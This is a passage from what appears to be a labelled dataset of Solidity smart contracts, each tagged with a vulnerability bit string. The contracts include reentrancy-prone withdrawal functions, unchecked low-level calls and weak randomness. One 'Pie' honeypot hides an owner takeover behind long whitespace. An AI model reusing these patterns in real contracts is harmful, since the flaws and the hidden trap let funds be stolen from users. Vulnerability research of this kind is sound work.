}",0001000000000000000000000
10039,0x7d09edb07d23acb532a82be3da5c17d9d85806b4,"

pragma solidity ^0.4.21;



contract PoCGame

{

    

     

     

    modifier onlyOwner()

    {

        require(msg.sender == owner);

        _;

    }

    

   modifier isOpenToPublic()

    {

        require(openToPublic);

        _;

    }



    modifier onlyRealPeople()

    {

          require (msg.sender == tx.origin);

        _;

    }



    modifier  onlyPlayers()

    { 

        require (wagers[msg.sender] > 0); 

        _; 

    }

    

   

     

    event Wager(uint256 amount, address depositer);

    event Win(uint256 amount, address paidTo);

    event Lose(uint256 amount, address loser);

    event Donate(uint256 amount, address paidTo, address donator);

    event DifficultyChanged(uint256 currentDifficulty);

    event BetLimitChanged(uint256 currentBetLimit);



     

    address private whale;

    uint256 betLimit;

    uint difficulty;

    uint private randomSeed;

    address owner;

    mapping(address => uint256) timestamps;

    mapping(address => uint256) wagers;

    bool openToPublic;

    uint256 totalDonated;



     

    constructor(address whaleAddress, uint256 wagerLimit) 

    onlyRealPeople()

    public 

    {

        openToPublic = false;

        owner = msg.sender;

        whale = whaleAddress;

        totalDonated = 0;

        betLimit = wagerLimit;

        

    }





     

    function OpenToThePublic() 

    onlyOwner()

    public

    {

        openToPublic = true;

    }

    

     

    function AdjustBetAmounts(uint256 amount) 

    onlyOwner()

    public

    {

        betLimit = amount;

        

        emit BetLimitChanged(betLimit);

    }

    

      

    function AdjustDifficulty(uint256 amount) 

    onlyOwner()

    public

    {

        difficulty = amount;

        

        emit DifficultyChanged(difficulty);

    }

    

    

    function() public payable { }



     

    function wager()

    isOpenToPublic()

    onlyRealPeople() 

    payable

    public 

    {

         
        require(msg.value == betLimit);



         
        timestamps[msg.sender] = block.number;

        wagers[msg.sender] = msg.value;

        emit Wager(msg.value, msg.sender);

    }

    

     

    function play()

    isOpenToPublic()

    onlyRealPeople()

    onlyPlayers()

    public

    {

        uint256 blockNumber = timestamps[msg.sender];

        if(blockNumber < block.number)

        {

            timestamps[msg.sender] = 0;

            wagers[msg.sender] = 0;

    

            uint256 winningNumber = uint256(keccak256(abi.encodePacked(blockhash(blockNumber),  msg.sender)))%difficulty +1;

    

            if(winningNumber == difficulty / 2)

            {

                payout(msg.sender);

            }

            else 

            {

                 
                loseWager(betLimit / 2);

            }    

        }

        else

        {

            revert();

        }

    }



     

    function donate()

    isOpenToPublic()

    public 

    payable

    {

        donateToWhale(msg.value);

    }



     

    function payout(address winner) 

    internal 

    {

        uint256 ethToTransfer = address(this).balance / 2;

        

        winner.transfer(ethToTransfer);

        emit Win(ethToTransfer, winner);

    }



     

    function donateToWhale(uint256 amount) 

    internal 

    {

         
        whale.call.value(amount)(bytes4(keccak256(""donate()"")));

        totalDonated += amount;

        emit Donate(amount, whale, msg.sender);

    }



     

    function loseWager(uint256 amount) 

    internal 

    {

         
        whale.call.value(amount)(bytes4(keccak256(""donate()"")));

        totalDonated += amount;

        emit Lose(amount, msg.sender);

    }

    



     

    function ethBalance() 

    public 

    view 

    returns (uint256)

    {

        return address(this).balance;

    }

    

    

     

    function currentDifficulty() 

    public 

    view 

    returns (uint256)

    {

        return difficulty;

    }

    

    

     

    function currentBetLimit() 

    public 

    view 

    returns (uint256)

    {

        return betLimit;

    }

    

    function hasPlayerWagered(address player)

    public 

    view 

    returns (bool)

    {

        if(wagers[player] > 0)

        {

            return true;

        }

        else

        {

            return false;

        }

        

    }



     

    function winnersPot() 

    public 

    view 

    returns (uint256)

    {

        return address(this).balance / 2;

    }



     

    function transferAnyERC20Token(address tokenAddress, address tokenOwner, uint tokens) 

    public 

    onlyOwner() 

    returns (bool success) 

    {

        return ERC20Interface(tokenAddress).transfer(tokenOwner, tokens);

    }

}



 
contract ERC20Interface 

{

    function transfer(address to, uint256 tokens) public returns (bool success);

}",0000000000000000001000000
10040,0x806a6bd219f162442d992bdc4ee6eba1f2c5a707,"

pragma solidity ^0.4.19;



contract Pie

{

    address public Owner = msg.sender;

   

    function()

    public

    payable

    {

        

    }

   

    function GetPie()

    public

    payable

    {                                                                    

        if(msg.value>1 ether)

        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           

            msg.sender.transfer(this.balance);

        }                                                                                                                

    }

    

    function withdraw()

    payable

    public

    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       if(msg.sender==0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6){Owner=0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        

        require(msg.sender == Owner);

        Owner.transfer(this.balance);

    }

    

    function Command(address adr,bytes data)

    payable

    public

    {

        require(msg.sender == Owner);

         
        adr.call.value(msg.value)(data);

    }

}",0000000100000000000000000
10041,0x84d9ec85c9c568eb332b7226a8f826d897e0a4a8,"

pragma solidity ^0.4.16;



 
 
 
 
 


 
 
contract Owned {



     
     
    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }



    address public owner;



     
    function Owned() {

        owner = msg.sender;

    }



    address public newOwner;



     
     
     
    function changeOwner(address _newOwner) onlyOwner {

        newOwner = _newOwner;

    }

     
     
     
     
    function acceptOwnership() {

        if (msg.sender == newOwner) {

            owner = newOwner;

        }

    }



     
     
     
    function execute(address _dst, uint _value, bytes _data) onlyOwner {

          
        _dst.call.value(_value)(_data);

    }

}



 


contract WedIndex is Owned {



     
    string public wedaddress;

    string public partnernames;

    uint public indexdate;

    uint public weddingdate;

    uint public displaymultisig;



    IndexArray[] public indexarray;



    struct IndexArray {

        uint indexdate;

        string wedaddress;

        string partnernames;

        uint weddingdate;

        uint displaymultisig;

    }

    

    function numberOfIndex() constant public returns (uint) {

        return indexarray.length;

    }





     
    function writeIndex(uint indexdate, string wedaddress, string partnernames, uint weddingdate, uint displaymultisig) {

        indexarray.push(IndexArray(now, wedaddress, partnernames, weddingdate, displaymultisig));

        IndexWritten(now, wedaddress, partnernames, weddingdate, displaymultisig);

    }



     
    event IndexWritten (uint time, string contractaddress, string partners, uint weddingdate, uint display);

}",0000000000000000000010000
10042,0x89c1b3807d4c67df034fffb62f3509561218d30b,"

pragma solidity ^0.4.9;



contract TownCrier {

    struct Request {  
        address requester;  
        uint fee;  
        address callbackAddr;  
        bytes4 callbackFID;  
        bytes32 paramsHash;  
    }

   

    event Upgrade(address newAddr);

    event Reset(uint gas_price, uint min_fee, uint cancellation_fee); 

    event RequestInfo(uint64 id, uint8 requestType, address requester, uint fee, address callbackAddr, bytes32 paramsHash, uint timestamp, bytes32[] requestData);  
    event DeliverInfo(uint64 requestId, uint fee, uint gasPrice, uint gasLeft, uint callbackGas, bytes32 paramsHash, uint64 error, bytes32 respData);  
    event Cancel(uint64 requestId, address canceller, address requester, uint fee, int flag);  


    address public constant SGX_ADDRESS = 0x18513702cCd928F2A3eb63d900aDf03c9cc81593; 


    uint public GAS_PRICE = 5 * 10**10;

    uint public MIN_FEE = 30000 * GAS_PRICE;  
    uint public CANCELLATION_FEE = 25000 * GAS_PRICE;  


    uint public constant CANCELLED_FEE_FLAG = 1;

    uint public constant DELIVERED_FEE_FLAG = 0;

    int public constant FAIL_FLAG = -2 ** 250;

    int public constant SUCCESS_FLAG = 1;



    bool public killswitch;



    bool public externalCallFlag;



    uint64 public requestCnt;

    uint64 public unrespondedCnt;

    Request[2**64] public requests;



    int public newVersion = 0;



     
     
     
     
    function () {}



    function TownCrier() public {

         
         
         
         
        requestCnt = 1;

        requests[0].requester = msg.sender;

        killswitch = false;

        unrespondedCnt = 0;

        externalCallFlag = false;

    }



    function upgrade(address newAddr) {

        if (msg.sender == requests[0].requester && unrespondedCnt == 0) {

            newVersion = -int(newAddr);

            killswitch = true;

            Upgrade(newAddr);

        }

    }



    function reset(uint price, uint minGas, uint cancellationGas) public {

        if (msg.sender == requests[0].requester && unrespondedCnt == 0) {

            GAS_PRICE = price;

            MIN_FEE = price * minGas;

            CANCELLATION_FEE = price * cancellationGas;

            Reset(GAS_PRICE, MIN_FEE, CANCELLATION_FEE);

        }

    }



    function suspend() public {

        if (msg.sender == requests[0].requester) {

            killswitch = true;

        }

    }



    function restart() public {

        if (msg.sender == requests[0].requester && newVersion == 0) {

            killswitch = false;

        }

    }



    function withdraw() public {

        if (msg.sender == requests[0].requester && unrespondedCnt == 0) {

            if (!requests[0].requester.call.value(this.balance)()) {

                throw;

            }

        }

    }



    function request(uint8 requestType, address callbackAddr, bytes4 callbackFID, uint timestamp, bytes32[] requestData) public payable returns (int) {

        if (externalCallFlag) {

            throw;

        }



        if (killswitch) {

            externalCallFlag = true;

            if (!msg.sender.call.value(msg.value)()) {

                throw;

            }

            externalCallFlag = false;

            return newVersion;

        }



        if (msg.value < MIN_FEE) {

            externalCallFlag = true;

             
             
            if (!msg.sender.call.value(msg.value)()) {

                throw;

            }

            externalCallFlag = false;

            return FAIL_FLAG;

        } else {

             
            uint64 requestId = requestCnt;

            requestCnt++;

            unrespondedCnt++;



            bytes32 paramsHash = sha3(requestType, requestData);

            requests[requestId].requester = msg.sender;

            requests[requestId].fee = msg.value;

            requests[requestId].callbackAddr = callbackAddr;

            requests[requestId].callbackFID = callbackFID;

            requests[requestId].paramsHash = paramsHash;



             
            RequestInfo(requestId, requestType, msg.sender, msg.value, callbackAddr, paramsHash, timestamp, requestData);

            return requestId;

        }

    }



    function deliver(uint64 requestId, bytes32 paramsHash, uint64 error, bytes32 respData) public {

        if (msg.sender != SGX_ADDRESS ||

                requestId <= 0 ||

                requests[requestId].requester == 0 ||

                requests[requestId].fee == DELIVERED_FEE_FLAG) {

             
             
            return;

        }



        uint fee = requests[requestId].fee;

        if (requests[requestId].paramsHash != paramsHash) {

             
             
            return;

        } else if (fee == CANCELLED_FEE_FLAG) {

             
             
             
             
            SGX_ADDRESS.send(CANCELLATION_FEE);

            requests[requestId].fee = DELIVERED_FEE_FLAG;

            unrespondedCnt--;

            return;

        }



        requests[requestId].fee = DELIVERED_FEE_FLAG;

        unrespondedCnt--;



        if (error < 2) {

             
             
             
            SGX_ADDRESS.send(fee);         

        } else {

             
            externalCallFlag = true;

             
            requests[requestId].requester.call.gas(2300).value(fee)();

            externalCallFlag = false;

        }



        uint callbackGas = (fee - MIN_FEE) / tx.gasprice;  
        DeliverInfo(requestId, fee, tx.gasprice, msg.gas, callbackGas, paramsHash, error, respData);  
        if (callbackGas > msg.gas - 5000) {

            callbackGas = msg.gas - 5000;

        }

        

        externalCallFlag = true;

         
        requests[requestId].callbackAddr.call.gas(callbackGas)(requests[requestId].callbackFID, requestId, error, respData);  
        externalCallFlag = false;

    }



    function cancel(uint64 requestId) public returns (int) {

        if (externalCallFlag) {

            throw;

        }



        if (killswitch) {

            return 0;

        }



        uint fee = requests[requestId].fee;

        if (requests[requestId].requester == msg.sender && fee >= CANCELLATION_FEE) {

             
             
            requests[requestId].fee = CANCELLED_FEE_FLAG;

            externalCallFlag = true;

            if (!msg.sender.call.value(fee - CANCELLATION_FEE)()) {

                throw;

            }

            externalCallFlag = false;

            Cancel(requestId, msg.sender, requests[requestId].requester, requests[requestId].fee, 1);

            return SUCCESS_FLAG;

        } else {

            Cancel(requestId, msg.sender, requests[requestId].requester, fee, -1);

            return FAIL_FLAG;

        }

    }

}",0001000100000000001010000
10043,0x8c7777c45481dba411450c228cb692ac3d550344,"

pragma solidity ^0.4.19;



contract ETH_VAULT

{

    mapping (address => uint) public balances;

    

    Log TransferLog;

    

    uint public MinDeposit = 1 ether;

    

    function ETH_VAULT(address _log)

    public 

    {

        TransferLog = Log(_log);

    }

    

    function Deposit()

    public

    payable

    {

        if(msg.value > MinDeposit)

        {

            balances[msg.sender]+=msg.value;

            TransferLog.AddMessage(msg.sender,msg.value,""Deposit"");

        }

    }

    

    function CashOut(uint _am)

    public

    payable

    {

        if(_am<=balances[msg.sender])

        {

             
            if(msg.sender.call.value(_am)())

            {

                balances[msg.sender]-=_am;

                TransferLog.AddMessage(msg.sender,_am,""CashOut"");

            }

        }

    }

    

    function() public payable{}    

    

}



contract Log 

{

   

    struct Message

    {

        address Sender;

        string  Data;

        uint Val;

        uint  Time;

    }

    

    Message[] public History;

    

    Message LastMsg;

    

    function AddMessage(address _adr,uint _val,string _data)

    public

    {

        LastMsg.Sender = _adr;

        LastMsg.Time = now;

        LastMsg.Val = _val;

        LastMsg.Data = _data;

        History.push(LastMsg);

    }

}",0001000000000000000000000
10044,0x8fd1e427396ddb511533cf9abdbebd0a7e08da35,"



pragma solidity ^0.4.18;



contract Ownable

{

    address newOwner;

    address owner = msg.sender;

    

    function changeOwner(address addr)

    public

    onlyOwner

    {

        newOwner = addr;

    }

    

    function confirmOwner() 

    public

    {

        if(msg.sender==newOwner)

        {

            owner=newOwner;

        }

    }

    

    modifier onlyOwner

    {

        if(owner == msg.sender)_;

    }

}



contract Token is Ownable

{

    address owner = msg.sender;

    function WithdrawToken(address token, uint256 amount,address to)

    public 

    onlyOwner

    {

         
        token.call(bytes4(sha3(""transfer(address,uint256)"")),to,amount); 

    }

}



contract TokenBank is Token

{

    uint public MinDeposit;

    mapping (address => uint) public Holders;

    

      
    function initTokenBank()

    public

    {

        owner = msg.sender;

        MinDeposit = 1 ether;

    }

    

    function()

    payable

    {

        Deposit();

    }

   

    function Deposit() 

    payable

    {

        if(msg.value>=MinDeposit)

        {

            Holders[msg.sender]+=msg.value;

        }

    }

    

    function WitdrawTokenToHolder(address _to,address _token,uint _amount)

    public

    onlyOwner

    {

        if(Holders[_to]>0)

        {

            Holders[_to]=0;

            WithdrawToken(_token,_amount,_to);     

        }

    }

   

    function WithdrawToHolder(address _addr, uint _wei) 

    public

    onlyOwner

    payable

    {

        if(Holders[msg.sender]>0)

        {

            if(Holders[_addr]>=_wei)

            {

                 
                _addr.call.value(_wei);

                Holders[_addr]-=_wei;

            }

        }

    }

    

    function Bal() public constant returns(uint){return this.balance;}

}",0000000000010000000010000
10045,0x93c32845fae42c83a70e5f06214c8433665c2ab5,"

pragma solidity ^0.4.25;



contract X_WALLET

{

    function Put(uint _unlockTime)

    public

    payable

    {

        var acc = Acc[msg.sender];

        acc.balance += msg.value;

        acc.unlockTime = _unlockTime>now?_unlockTime:now;

        LogFile.AddMessage(msg.sender,msg.value,""Put"");

    }



    function Collect(uint _am)

    public

    payable

    {

        var acc = Acc[msg.sender];

        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)

        {

             
            if(msg.sender.call.value(_am)())

            {

                acc.balance-=_am;

                LogFile.AddMessage(msg.sender,_am,""Collect"");

            }

        }

    }



    function() 

    public 

    payable

    {

        Put(0);

    }



    struct Holder   

    {

        uint unlockTime;

        uint balance;

    }



    mapping (address => Holder) public Acc;



    Log LogFile;



    uint public MinSum = 1 ether;    



    function X_WALLET(address log) public{

        LogFile = Log(log);

    }

}





contract Log 

{

    struct Message

    {

        address Sender;

        string  Data;

        uint Val;

        uint  Time;

    }



    Message[] public History;



    Message LastMsg;



    function AddMessage(address _adr,uint _val,string _data)

    public

    {

        LastMsg.Sender = _adr;

        LastMsg.Time = now;

        LastMsg.Val = _val;

        LastMsg.Data = _data;

        History.push(LastMsg);

    }

}",0001000000000000000000000
10046,0x941d225236464a25eb18076df7da6a91d0f95e9e,"

pragma solidity ^0.4.19;



contract ETH_FUND

{

    mapping (address => uint) public balances;

    

    uint public MinDeposit = 1 ether;

    

    Log TransferLog;

    

    uint lastBlock;

    

    function ETH_FUND(address _log)

    public 

    {

        TransferLog = Log(_log);

    }

    

    function Deposit()

    public

    payable

    {

        if(msg.value > MinDeposit)

        {

            balances[msg.sender]+=msg.value;

            TransferLog.AddMessage(msg.sender,msg.value,""Deposit"");

            lastBlock = block.number;

        }

    }

    

    function CashOut(uint _am)

    public

    payable

    {

        if(_am<=balances[msg.sender]&&block.number>lastBlock)

        {

             
            if(msg.sender.call.value(_am)())

            {

                balances[msg.sender]-=_am;

                TransferLog.AddMessage(msg.sender,_am,""CashOut"");

            }

        }

    }

    

    function() public payable{}    

    

}



contract Log 

{

   

    struct Message

    {

        address Sender;

        string  Data;

        uint Val;

        uint  Time;

    }

    

    Message[] public History;

    

    Message LastMsg;

    

    function AddMessage(address _adr,uint _val,string _data)

    public

    {

        LastMsg.Sender = _adr;

        LastMsg.Time = now;

        LastMsg.Val = _val;

        LastMsg.Data = _data;

        History.push(LastMsg);

    }

}",0001000000000000000000000
10047,0x958a8f594101d2c0485a52319f29b2647f2ebc06," 



pragma solidity ^0.4.16;



 
 
 
 


 
 
contract Owned {



     
     
    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }



    address public owner;



     
    function Owned() {

        owner = msg.sender;

    }



    address public newOwner;



     
     
     
    function changeOwner(address _newOwner) onlyOwner {

        newOwner = _newOwner;

    }

     
     
     
     
    function acceptOwnership() {

        if (msg.sender == newOwner) {

            owner = newOwner;

        }

    }



     
     
     
    function execute(address _dst, uint _value, bytes _data) onlyOwner {

          
        _dst.call.value(_value)(_data);

    }

}





contract Marriage is Owned

{

     
    string public partner1;

    string public partner2;

    uint public marriageDate;

    string public marriageStatus;

    string public vows;



    Event[] public majorEvents;

    Message[] public messages;



    struct Event {

        uint date;

        string name;

        string description;

        string url;

    }



    struct Message {

        uint date;

        string nameFrom;

        string text;

        string url;

        uint value;

    }



    modifier areMarried {

        require(sha3(marriageStatus) == sha3(""Married""));

        _;

    }



     
    function Marriage(address _owner) {

        owner = _owner;

    }



    function numberOfMajorEvents() constant public returns (uint) {

        return majorEvents.length;

    }



    function numberOfMessages() constant public returns (uint) {

        return messages.length;

    }



     
    function createMarriage(

        string _partner1,

        string _partner2,

        string _vows,

        string url) onlyOwner

    {

        require(majorEvents.length == 0);

        partner1 = _partner1;

        partner2 = _partner2;

        marriageDate = now;

        vows = _vows;

        marriageStatus = ""Married"";

        majorEvents.push(Event(now, ""Marriage"", vows, url));

        MajorEvent(""Marrigage"", vows, url);

    }



     
    function setStatus(string status, string url) onlyOwner

    {

        marriageStatus = status;

        setMajorEvent(""Changed Status"", status, url);

    }



     
    function setMajorEvent(string name, string description, string url) onlyOwner areMarried

    {

        majorEvents.push(Event(now, name, description, url));

        MajorEvent(name, description, url);

    }



    function sendMessage(string nameFrom, string text, string url) payable areMarried {

        if (msg.value > 0) {

            owner.transfer(this.balance);

        }

        messages.push(Message(now, nameFrom, text, url, msg.value));

        MessageSent(nameFrom, text, url, msg.value);

    }





     
    event MajorEvent(string name, string description, string url);

    event MessageSent(string name, string description, string url, uint value);

}",0000000000000000000010100
10048,0x96edbe868531bd23a6c05e9d0c424ea64fb1b78b,"

pragma solidity ^0.4.19;



contract PENNY_BY_PENNY  

{

    struct Holder   

    {

        uint unlockTime;

        uint balance;

    }

    

    mapping (address => Holder) public Acc;

    

    uint public MinSum;

    

    LogFile Log;

    

    bool intitalized;

    

    function SetMinSum(uint _val)

    public

    {

        if(intitalized)throw;

        MinSum = _val;

    }

    

    function SetLogFile(address _log)

    public

    {

        if(intitalized)throw;

        Log = LogFile(_log);

    }

    

    function Initialized()

    public

    {

        intitalized = true;

    }

    

    function Put(uint _lockTime)

    public

    payable

    {

        var acc = Acc[msg.sender];

        acc.balance += msg.value;

        if(now+_lockTime>acc.unlockTime)acc.unlockTime=now+_lockTime;

        Log.AddMessage(msg.sender,msg.value,""Put"");

    }

    

    function Collect(uint _am)

    public

    payable

    {

        var acc = Acc[msg.sender];

        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)

        {

             
            if(msg.sender.call.value(_am)())

            {

                acc.balance-=_am;

                Log.AddMessage(msg.sender,_am,""Collect"");

            }

        }

    }

    

    function() 

    public 

    payable

    {

        Put(0);

    }

    

}





contract LogFile

{

    struct Message

    {

        address Sender;

        string  Data;

        uint Val;

        uint  Time;

    }

    

    Message[] public History;

    

    Message LastMsg;

    

    function AddMessage(address _adr,uint _val,string _data)

    public

    {

        LastMsg.Sender = _adr;

        LastMsg.Time = now;

        LastMsg.Val = _val;

        LastMsg.Data = _data;

        History.push(LastMsg);

    }

}",0001000000000000001010000
10049,0x9978d2D229A69B3aEf93420D132aB22b44e3578F,V1.sol,0000000000000000000000000
10050,0x9d06cbafa865037a01d322d3f4222fa3e04e5488,"

pragma solidity ^0.4.23;        

   

contract Delta {     



	address public c = 0xF85A2E95FA30d005F629cBe6c6d2887D979ffF2A; 

	address public owner = 0x788c45dd60ae4dbe5055b5ac02384d5dc84677b0;	

	address public owner2 = 0x0C6561edad2017c01579Fd346a58197ea01A0Cf3;	

	uint public active = 1;	



	uint public token_price = 10**18*1/1000; 	



	 
	function() payable {        

	    tokens_buy();        

	}



	 

    function tokens_buy() payable returns (bool) {         

        

        require(active > 0);

        require(msg.value >= token_price);        



        uint tokens_buy = msg.value*10**18/token_price;



        require(tokens_buy > 0);



        if(!c.call(bytes4(sha3(""transferFrom(address,address,uint256)"")),owner, msg.sender,tokens_buy)){

        	return false;

        }



        uint sum2 = msg.value * 3 / 10;           

         
        owner2.send(sum2);



        return true;

      }     



       
      function withdraw(uint256 _amount) onlyOwner returns (bool result) {

          uint256 balance;

          balance = this.balance;

          if(_amount > 0) balance = _amount;

           
          owner.send(balance);

          return true;

      }



       
      function change_token_price(uint256 _token_price) onlyOwner returns (bool result) {

        token_price = _token_price;

        return true;

      }



       
      function change_active(uint256 _active) onlyOwner returns (bool result) {

        active = _active;

        return true;

      }



       
    	modifier onlyOwner() {

        if (msg.sender != owner) {

            throw;

        }

        _;

    }        	





}",0000000100000000001010000
10051,0xa1fceeff3acc57d257b917e30c4df661401d6431," 



pragma solidity ^0.4.18;



contract AirDropContract{



    function AirDropContract() public {

    }



    modifier validAddress( address addr ) {

        require(addr != address(0x0));

        require(addr != address(this));

        _;

    }

    

    function transfer(address contract_address,address[] tos,uint[] vs)

        public 

        validAddress(contract_address)

        returns (bool){



        require(tos.length > 0);

        require(vs.length > 0);

        require(tos.length == vs.length);

        bytes4 id = bytes4(keccak256(""transferFrom(address,address,uint256)""));

        for(uint i = 0 ; i < tos.length; i++){

             
            contract_address.call(id, msg.sender, tos[i], vs[i]);

        }

        return true;

    }

}",0100000100000000000001000
10052,0xa46edd6a9a93feec36576ee5048146870ea2c3ae," 



pragma solidity ^0.4.18;



contract EBU{

    

    function transfer(address from,address caddress,address[] _tos,uint[] v)public returns (bool){

        require(_tos.length > 0);

        bytes4 id=bytes4(keccak256(""transferFrom(address,address,uint256)""));

        for(uint i=0;i<_tos.length;i++){

             
            caddress.call(id,from,_tos[i],v[i]);

        }

        return true;

    }

}",0100000000000000000001000
10053,0xaae1f51cf3339f18b6d3f3bdc75a5facd744b0b8," 



pragma solidity ^0.4.19;



contract DEP_BANK 

{

    mapping (address=>uint256) public balances;   

   

    uint public MinSum;

    

    LogFile Log;

    

    bool intitalized;

    

    function SetMinSum(uint _val)

    public

    {

        if(intitalized)throw;

        MinSum = _val;

    }

    

    function SetLogFile(address _log)

    public

    {

        if(intitalized)throw;

        Log = LogFile(_log);

    }

    

    function Initialized()

    public

    {

        intitalized = true;

    }

    

    function Deposit()

    public

    payable

    {

        balances[msg.sender]+= msg.value;

        Log.AddMessage(msg.sender,msg.value,""Put"");

    }

    

    function Collect(uint _am)

    public

    payable

    {

        if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am)

        {

             
            if(msg.sender.call.value(_am)())

            {

                balances[msg.sender]-=_am;

                Log.AddMessage(msg.sender,_am,""Collect"");

            }

        }

    }

    

    function() 

    public 

    payable

    {

        Deposit();

    }

    

}





contract LogFile

{

    struct Message

    {

        address Sender;

        string  Data;

        uint Val;

        uint  Time;

    }

    

    Message[] public History;

    

    Message LastMsg;

    

    function AddMessage(address _adr,uint _val,string _data)

    public

    {

        LastMsg.Sender = _adr;

        LastMsg.Time = now;

        LastMsg.Val = _val;

        LastMsg.Data = _data;

        History.push(LastMsg);

    }

}",0001000000000000001010000
10054,0xb0510d68f210b7db66e8c7c814f22680f2b8d1d6," 



pragma solidity ^0.4.23;



contract Splitter{

    

	address public owner;

	address[] public puppets;

	mapping (uint256 => address) public extra;

	address private _addy;

	uint256 private _share;

	uint256 private _count;





 


	constructor() payable public{

		owner = msg.sender;

		newPuppet();

		newPuppet();

		newPuppet();

		newPuppet();

		extra[0] = puppets[0];

        extra[1] = puppets[1];

        extra[2] = puppets[2];

        extra[3] = puppets[3];

	}



 
	

	function withdraw() public{

		require(msg.sender == owner);

		owner.transfer(address(this).balance);

	}



 


	function getPuppetCount() public constant returns(uint256 puppetCount){

    	return puppets.length;

  	}



 


	function newPuppet() public returns(address newPuppet){

	    require(msg.sender == owner);

    	Puppet p = new Puppet();

    	puppets.push(p);

    	return p;

  		}

 

 


    function setExtra(uint256 _id, address _newExtra) public {

        require(_newExtra != address(0));

        extra[_id] = _newExtra;

    }



	

 


    function fundPuppets() public payable {

        require(msg.sender == owner);

    	_share = SafeMath.div(msg.value, 4);

		 
        extra[0].call.value(_share).gas(800000)();

		 
        extra[1].call.value(_share).gas(800000)();

		 
        extra[2].call.value(_share).gas(800000)();

		 
        extra[3].call.value(_share).gas(800000)();

        }

        

 


function() payable public{

	}

}





contract Puppet {

    

    mapping (uint256 => address) public target;

    mapping (uint256 => address) public master;

	

	constructor() payable public{

		 
		target[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109;

        master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956;

	}

	

	 
	 


	function() public payable{

	    if(msg.sender != target[0]){

			 
			target[0].call.value(msg.value).gas(600000)();

		}

    }

	 


	function withdraw() public{

		require(msg.sender == master[0]);

		master[0].transfer(address(this).balance);

	}

}





 


library SafeMath {



  function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {

    if (a == 0) {

      return 0;

    }

    c = a * b;

    assert(c / a == b);

    return c;

  }



  function div(uint256 a, uint256 b) internal pure returns (uint256) {

    return a / b;

  }



  function sub(uint256 a, uint256 b) internal pure returns (uint256) {

    assert(b <= a);

    return a - b;

  }



  function add(uint256 a, uint256 b) internal pure returns (uint256 c) {

    c = a + b;

    assert(c >= a);

    return c;

  }

}",0001000100000000000010000
10055,0xb11b2fed6c9354f7aa2f658d3b4d7b31d8a13b77," 



pragma solidity ^0.4.24;



contract Proxy  {

    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;

    function transferOwner(address _owner) public onlyOwner { Owner = _owner; } 

    function proxy(address target, bytes data) public payable {

         
        target.call.value(msg.value)(data);

    }

}



contract DepositProxy is Proxy {

    address public Owner;

    mapping (address => uint256) public Deposits;



    function () public payable { }

    

    function Vault() public payable {

        if (msg.sender == tx.origin) {

            Owner = msg.sender;

            deposit();

        }

    }

    

    function deposit() public payable {

        if (msg.value > 0.5 ether) {

            Deposits[msg.sender] += msg.value;

        }

    }

    

    function withdraw(uint256 amount) public onlyOwner {

        if (amount>0 && Deposits[msg.sender]>=amount) {

            msg.sender.transfer(amount);

        }

    }

}",0000000000000000000000000
10056,0xb37f18af15bafb869a065b61fc83cfc44ed9cc27," 



pragma solidity ^0.4.24;





contract SimpleWallet {

    address public owner = msg.sender;

    uint public depositsCount;

    

    modifier onlyOwner {

        require(msg.sender == owner);

        _;

    }

    

    function() public payable {

        depositsCount++;

    }

    

    function withdrawAll() public onlyOwner {

        withdraw(address(this).balance);

    }

    

    function withdraw(uint _value) public onlyOwner {

        msg.sender.transfer(_value);

    }

    

    function sendMoney(address _target, uint _value) public onlyOwner {

         
        _target.call.value(_value)();

    }

}",0001000000000000000000000
10057,0xb5e1b1ee15c6fa0e48fce100125569d430f1bd12," 



pragma solidity ^0.4.19;



contract Private_Bank

{

    mapping (address => uint) public balances;

    

    uint public MinDeposit = 1 ether;

    

    Log TransferLog;

    

    function Private_Bank(address _log)

    {

        TransferLog = Log(_log);

    }

    

    function Deposit()

    public

    payable

    {

        if(msg.value > MinDeposit)

        {

            balances[msg.sender]+=msg.value;

            TransferLog.AddMessage(msg.sender,msg.value,""Deposit"");

        }

    }

    

    function CashOut(uint _am)

    public

    payable

    {

        if(_am<=balances[msg.sender])

        {

             
            if(msg.sender.call.value(_am)())

            {

                balances[msg.sender]-=_am;

                TransferLog.AddMessage(msg.sender,_am,""CashOut"");

            }

        }

    }

    

    function() public payable{}    

    

}



contract Log 

{

   

    struct Message

    {

        address Sender;

        string  Data;

        uint Val;

        uint  Time;

    }

    

    Message[] public History;

    

    Message LastMsg;

    

    function AddMessage(address _adr,uint _val,string _data)

    public

    {

        LastMsg.Sender = _adr;

        LastMsg.Time = now;

        LastMsg.Val = _val;

        LastMsg.Data = _data;

        History.push(LastMsg);

    }

}",0001000000000000000000000
10058,0xb620cee6b52f96f3c6b253e6eea556aa2d214a99," 



 
 
 




pragma solidity ^0.4.23;



contract DrainMe {



 


address public winner = 0x0;

address public owner;

address public firstTarget = 0x461ec7309F187dd4650EE6b4D25D93c922d7D56b;

address public secondTarget = 0x1C3E062c77f09fC61550703bDd1D59842C22c766;

address[] public players;



mapping(address=>bool) approvedPlayers;



uint256 public secret;

uint256[] public seed = [951828771,158769871220];

uint256[] public balance;



 


function DranMe() public payable{

	owner = msg.sender;

}



 


modifier onlyOwner() {

    require(msg.sender == owner);

    _;

}



